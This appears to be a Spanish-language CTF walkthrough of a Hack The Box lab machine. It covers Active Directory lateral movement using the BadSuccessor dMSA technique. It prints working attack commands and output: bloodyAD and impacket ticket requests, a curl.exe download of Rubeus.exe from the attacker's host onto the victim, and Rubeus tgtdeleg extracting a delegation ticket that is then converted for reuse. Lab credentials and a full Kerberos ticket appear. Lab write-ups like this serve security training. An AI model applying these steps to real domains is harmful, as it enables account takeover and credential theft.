Flujo de escalada hacia una cuenta de servicio (lateral movement):

- Alex crea una cuenta con dMSA mediante su permiso CREATE_CHILD en OU=Employees subcayente de `svc_deploy`
- Ryan al tener permiso WRITE sobre svc_deploy escribe los atributos `msDS-Superseded*` necesarios para completar la sincronizacion mutua de ambos lados: Alex crea cuenta dMSA heredada de svc_deploy > ryan escribe atributos en svc_deploy para completar la sincronicacion y ejecutar badsuccessor con exito.

``` bash

❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor svc_pwn -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=Employees,DC=checkpoint,DC=htb' --prepatch
[+] Creating DMSA svc_pwn$ in OU=Employees,DC=checkpoint,DC=htb
[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
[-] Failed to retrieve dMSA TGT
[-] Try using Rubeus, or something like:
[-] badS4U2self 'kerberos+pw://checkpoint.htb\alex.turner:Checkpoint2024%21@10.129.113.22/' 'krbtgt/checkpoint.htb@checkpoint.htb' 'svc_pwn$@checkpoint.htb' --dmsa
Traceback (most recent call last):
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 313, in get_TGT
    preauth_rep = self.do_preauth(etype, with_pac=with_pac)
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
    rep = self.ksoc.sendrecv(req.dump())
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/home/joel/.local/bin/bloodyAD", line 6, in <module>
    sys.exit(main())
             ~~~~^^
  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 195, in badSuccessor
    raise e
  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 186, in badSuccessor
    tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
                              ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 845, in with_clock_skew
    return func(*args, **kwargs)
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 556, in S4U2self
    self.get_TGT()
    ~~~~~~~~~~~~^^
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 323, in get_TGT
    preauth_rep = self.do_preauth(srv_etype, with_pac=with_pac)
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
    rep = self.ksoc.sendrecv(req.dump())
  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
    raise KerberosError(krb_message)
kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                               1 х ─╮
╰─                                                                                                               ─╯

```

``` bash

❯ nxc ldap 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --query '(sAMAccountName=svc_pwn$)' 'distinguishedName msDS-ManagedAccountPrecededByLink'
LDAP        10.129.113.22   389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.113.22   389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
LDAP        10.129.113.22   389    DC01             [+] Response for object: CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
LDAP        10.129.113.22   389    DC01             distinguishedName    CN=svc_pwn,OU=Employees,DC=checkpoint,DC=htb
LDAP        10.129.113.22   389    DC01             msDS-ManagedAccountPrecededByLink CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                           ✔ │ 14s ─╮
╰─                                                                                                               ─╯

```

``` bash

❯ sudo ntpdate 10.129.113.22

2026-08-29 05:04:01.315246 (+0200) +25144.841347 +/- 0.020970 10.129.113.22 s1 no-leap
CLOCK: time stepped by 25144.841347
❯ impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.113.22
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in alex.turner.ccache
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                            ✔ │ 4s ─╮
╰─                                                                                                               ─╯

```

``` bash

❯ export KRB5CCNAME=alex.turner.ccache

❯ impacket-getST -dc-ip 10.129.113.22 -spn 'cifs/dc01.checkpoint.htb' 'checkpoint.htb/svc_pwn$' -k -no-pass -dmsa
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Getting ST for user
[*] Saving ticket in svc_pwn$@cifs_dc01.checkpoint.htb@CHECKPOINT.HTB.ccache
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
╰─                                                                                                               ─╯

```

``` bash

PS C:\Users\ryan.brooks\Desktop> curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  436k  100  436k    0     0  1348k      0 --:--:-- --:--:-- --:--:-- 1355k
PS C:\Users\ryan.brooks\Desktop>

```

``` bash

PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe tgtdeleg /nowrap
.\Rubeus.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: ZJMPf2li2BnlGh0V8cAgr+gyfNxWjLDmi/55xow3rjA=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuC0G5PhMloPmNedBDCEL2mZyaH7Uq8kXphUNy1Eg84oNFk93xHu7PFqhlGJXxygHC2NncU4JNtfwk8qpJfsX9qXisjLlMjJoANs40tKcMF1R9+V2xdQ1yU9gavEkJeJ8XeiQg+fyvlYnL4L0G63ZxgpM6FydmRdUNV/oFajXceeJQ7zo2RtaUMZFh7c2m8pv0NlDQ4IK5nRYd5L9NT9FbocJGR2qaa9Q9H/3egvzLW6+UFYXNWW+exGm4cieNLJrzqk3yt9Lnh3DqnRPNLO63t3wKcWqFRNjtsi/yVRAIZTPNpnt96e4KHviF/W1qrCjBYNSuI93pf6tLKzC9+O1ik2wsEzhO/8JJqloXkwlaQdlg4eHaiYnTn+5TGSLZiPO7FOWbkpUCN1QGLjeiytUbSKbbLzi2YPK8mxbCUDAcNfzQe6lHspeMdjjuDlMUC82FgLL7U0DGmm7d+hxnFAAR/zKRmwy9WVvYVN9izoIt5/Ars+PGyzVnOgsDzwuLk+H7mhJYC6Z+/3BtK/dtU24qqa5XYGYKopA+nbHCkJd6MoxFx//W+QEkpbPHuk5/zBk/uQihGNSshB7D4XgSM/k2SPkfWPHiqh7a0uxIxSKBjj8xjtXiYng0vDL2ODc3LxIJ2Bm9lKdX4fKQ93DErEU8/kgG65b9ciQGPfTaYMiz53CXMluTife+G7yNclTQkW2kc4WfGrmBhAv9/einyur8B92lYEqTYuW//J+ouQpeipKHkPJcCdV61fFA5UuT/XadwuQFna7gEi8Qzc11+GQQp4eGjb4CQm2CLBQqfeVksb720tLBOo6fVCZiKATZ3d4QpMHpfYE/ob3c0K5T1effkUeBNuzKOE/TMEkxY0x82KmuE0BCq7ospEhGDL1XMjiEJkanFd6ZJFRkUyBrhMN1VJYuwwlnSxVKkWJgLPJgK7iWh+TDzXa08bbSlwVrWJyo6xYeO93Us6Qw6kUioTPtL0UNWTIIg5ii2TKzLnyBo/UwYFcaSUBRrOyEiHCI/gLg9djDb0VuPbJFX/tH/AFr/W3UK98r5hQqINiGvDDYaVaAxyAMX+RCWFNaDMYeO++GvsJmU8zDxiW4k8GRYVIXjLJyVuXVub1swc0Yy69H67pbQg+MLJa6DX7RZQNB6b4JRSlSYFnI0JUEvsyXM2LaIsiChUdsFVreZJsDKmaf9MKYfPKQoblpQ1tXEhxg0VTg06J9k9JRtDxDfxTHzS41WVWt6XBSkQAVzulv/iviRZmsQD4jhlFgrSLSPaOhwsHmcrJPiwVrYxNzDNspd+BE4pwEBXH3yCpjUkxC3YUhRPgi4U4hnaBW3lu7ZSateFxONEI+Q6J5LMZ9NhP2zQ1sJddLIumPNv3jTaegTXQF8B8brycBB77f2xzVGyM+YB4Ut28BYB0sxQJnxodihNy0crr+B0xWhWR627qorSGU0aQYho1g7jpJHEWp4H6sciparhKNUjEERlsqrlOQGJbEvVbR9fdkK5ewNXwh06m/o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgxNcLQf101xeBHH10fp7tco8LTIDWh6w/J4HWk0G/ky+hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDgyOTA1MjY1MlqmERgPMjAyNjA4MjkxNTE2NDNapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
PS C:\Users\ryan.brooks\Desktop>

```

``` bash

❯ echo "doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuC0G5PhMloPmNedBDCEL2mZyaH7Uq8kXphUNy1Eg84oNFk93xHu7PFqhlGJXxygHC2NncU4JNtfwk8qpJfsX9qXisjLlMjJoANs40tKcMF1R9+V2xdQ1yU9gavEkJeJ8XeiQg+fyvlYnL4L0G63ZxgpM6FydmRdUNV/oFajXceeJQ7zo2RtaUMZFh7c2m8pv0NlDQ4IK5nRYd5L9NT9FbocJGR2qaa9Q9H/3egvzLW6+UFYXNWW+exGm4cieNLJrzqk3yt9Lnh3DqnRPNLO63t3wKcWqFRNjtsi/yVRAIZTPNpnt96e4KHviF/W1qrCjBYNSuI93pf6tLKzC9+O1ik2wsEzhO/8JJqloXkwlaQdlg4eHaiYnTn+5TGSLZiPO7FOWbkpUCN1QGLjeiytUbSKbbLzi2YPK8mxbCUDAcNfzQe6lHspeMdjjuDlMUC82FgLL7U0DGmm7d+hxnFAAR/zKRmwy9WVvYVN9izoIt5/Ars+PGyzVnOgsDzwuLk+H7mhJYC6Z+/3BtK/dtU24qqa5XYGYKopA+nbHCkJd6MoxFx//W+QEkpbPHuk5/zBk/uQihGNSshB7D4XgSM/k2SPkfWPHiqh7a0uxIxSKBjj8xjtXiYng0vDL2ODc3LxIJ2Bm9lKdX4fKQ93DErEU8/kgG65b9ciQGPfTaYMiz53CXMluTife+G7yNclTQkW2kc4WfGrmBhAv9/einyur8B92lYEqTYuW//J+ouQpeipKHkPJcCdV61fFA5UuT/XadwuQFna7gEi8Qzc11+GQQp4eGjb4CQm2CLBQqfeVksb720tLBOo6fVCZiKATZ3d4QpMHpfYE/ob3c0K5T1effkUeBNuzKOE/TMEkxY0x82KmuE0BCq7ospEhGDL1XMjiEJkanFd6ZJFRkUyBrhMN1VJYuwwlnSxVKkWJgLPJgK7iWh+TDzXa08bbSlwVrWJyo6xYeO93Us6Qw6kUioTPtL0UNWTIIg5ii2TKzLnyBo/UwYFcaSUBRrOyEiHCI/gLg9djDb0VuPbJFX/tH/AFr/W3UK98r5hQqINiGvDDYaVaAxyAMX+RCWFNaDMYeO++GvsJmU8zDxiW4k8GRYVIXjLJyVuXVub1swc0Yy69H67pbQg+MLJa6DX7RZQNB6b4JRSlSYFnI0JUEvsyXM2LaIsiChUdsFVreZJsDKmaf9MKYfPKQoblpQ1tXEhxg0VTg06J9k9JRtDxDfxTHzS41WVWt6XBSkQAVzulv/iviRZmsQD4jhlFgrSLSPaOhwsHmcrJPiwVrYxNzDNspd+BE4pwEBXH3yCpjUkxC3YUhRPgi4U4hnaBW3lu7ZSateFxONEI+Q6J5LMZ9NhP2zQ1sJddLIumPNv3jTaegTXQF8B8brycBB77f2xzVGyM+YB4Ut28BYB0sxQJnxodihNy0crr+B0xWhWR627qorSGU0aQYho1g7jpJHEWp4H6sciparhKNUjEERlsqrlOQGJbEvVbR9fdkK5ewNXwh06m/o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgxNcLQf101xeBHH10fp7tco8LTIDWh6w/J4HWk0G/ky+hEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDgyOTA1MjY1MlqmERgPMjAyNjA4MjkxNTE2NDNapxEYDzIwMjYwOTA1MDQzMTA4WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=" > ryan.b64
❯ base64 -d ryan.b64 > ryan.kirbi
❯ impacket-ticketConverter ryan.kirbi ryan.ccache
Impacket v0.14.0.dev0+20260828.120813.032dfb1b - Copyright Fortra, LLC and its affiliated companies

[*] converting kirbi to ccache...
[+] done
❯ export KRB5CCNAME=ryan.ccache
╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                                 ✔ ─╮
╰─                                                                                                               ─╯

```
